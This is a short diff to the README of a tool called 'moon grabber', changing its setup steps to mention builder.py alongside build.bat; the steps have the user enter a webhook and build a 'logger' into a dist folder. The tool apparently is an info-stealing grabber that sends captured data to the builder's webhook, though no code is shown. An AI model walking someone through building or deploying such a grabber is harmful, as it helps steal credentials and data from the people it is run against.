@@ -37,7 +37,7 @@
 ## Setup
 
 1. Download moon grabber
-2. Run build.bat
+2. Run build.bat (or u could run builder.py)
 3. if you have python installed, press y else press n
 4. enter your webhook
 5. it will build the logger for you. when the terminal closes, check the moon grabber folder for a folder called dist.
